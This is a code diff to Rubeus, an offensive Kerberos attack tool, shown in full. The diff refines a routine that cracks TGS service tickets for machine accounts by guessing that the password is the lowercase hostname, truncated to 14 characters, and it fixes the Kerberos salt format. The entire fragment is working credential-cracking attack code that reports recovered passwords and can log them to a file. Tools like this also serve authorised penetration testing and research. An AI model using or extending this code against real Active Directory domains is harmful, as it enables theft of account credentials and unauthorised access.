@@ -1207,9 +1207,15 @@ namespace Rubeus
             
             byte[] cipherText = TGS.tickets[0].enc_part.cipher;
             int encType = TGS.tickets[0].enc_part.etype;
-
-            if (CrackTGS(cipherText, encType, hostname, domain, hostname.ToLower())) {
-                string message = String.Format("[=] Found password of {0} -> {1}", hostname, hostname.ToLower());
+	    string password = hostname.ToLower();
+	    // if account name is over 14 characters, the password should be the first 14 characters only
+	    // due to the old windows hashing algorithms compatibility
+	    if (hostname.Length > 14)
+	    {
+		password = hostname.ToLower().Substring(0, 14);
+	    }
+            if (CrackTGS(cipherText, encType, hostname, domain, password)) {
+                string message = String.Format("[=] Found password of {0} -> {1}", hostname, password);
                 Console.WriteLine(message);
                 if (!String.IsNullOrEmpty(outFile))
                 {
@@ -1298,9 +1304,16 @@ namespace Rubeus
                                     if (elem3.TagValue == 2)
                                     {
                                         byte[] cipherText = elem3.Sub[0].GetOctetString();
-                                        if (CrackTGS(cipherText, (int)encType, hostname, domain, hostname.ToLower()))
+					string password = hostname.ToLower();
+					// if account name is over 14 characters, the password should be the first 14 characters only
+					// due to the old windows hashing algorithms compatibility
+					if (hostname.Length > 14)
+					{
+					    password = hostname.ToLower().Substring(0, 14);	
+					}
+                                        if (CrackTGS(cipherText, (int)encType, hostname, domain, password))
                                         {
-                                            string message = String.Format("[=] Found password of {0} -> {1}", hostname, hostname.ToLower());
+                                            string message = String.Format("[=] Found password of {0} -> {1}", hostname, password);
                                             Console.WriteLine(message);
                                             if (!String.IsNullOrEmpty(outFile))
                                             {
@@ -1349,7 +1362,7 @@ namespace Rubeus
 
         public static bool CrackTGS(byte[] cipherText, int encType, string hostname, string domain, string password)
         {
-            string salt = String.Format("{0}{1}", domain.ToUpper(), hostname);
+            string salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), hostname.ToLower(), domain.ToLower());
             string hash;
             byte[] key;
             Interop.KERB_ETYPE tgsEType;
